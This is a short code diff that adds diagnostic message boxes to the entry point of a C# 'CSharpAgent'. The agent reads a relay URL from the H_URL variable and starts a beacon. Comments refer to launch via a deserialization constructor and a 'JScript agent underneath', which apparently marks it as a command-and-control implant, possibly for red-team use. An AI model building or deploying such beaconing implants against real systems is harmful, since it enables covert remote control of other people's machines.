@@ -42,12 +42,30 @@ namespace CSharpAgent
         {
             if (_entered) return;
             _entered = true;
+
+            // [1] — proves the type initialized and the body is running (exe entry OR
+            // deserialization ctor; if a Win7 run dies BEFORE this box, the failure is in
+            // type init itself — JIT/permission/mask — not in the beacon).
+            Diag.Show("[1] start", "process started — type initialized, Main entered");
+
             var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
             if (string.IsNullOrEmpty(beaconUrl))
             {
+                // [exit] — the silent exit most likely behind "runs then exits": the exe
+                // was launched without H_URL in its environment.
+                Diag.Show("[exit] no H_URL",
+                    "H_URL is not set — nothing to beacon, returning.\n" +
+                    "Launch from a shell that has it:\n" +
+                    "  set H_URL=https://<relay>/ && csharp-agent-<net2>-<arch>.exe");
                 return;
             }
+            Diag.Show("[2] H_URL", beaconUrl);
+
             Beacon.Run(beaconUrl);
+            Diag.Show("[exit] Run returned",
+                "Beacon.Run returned — a fatal transport/protocol exit (see the last " +
+                "[exit] caption above this one, if any). Process ends; the JScript agent " +
+                "underneath resumes when this run was a deserialization.");
         }
     }
 }
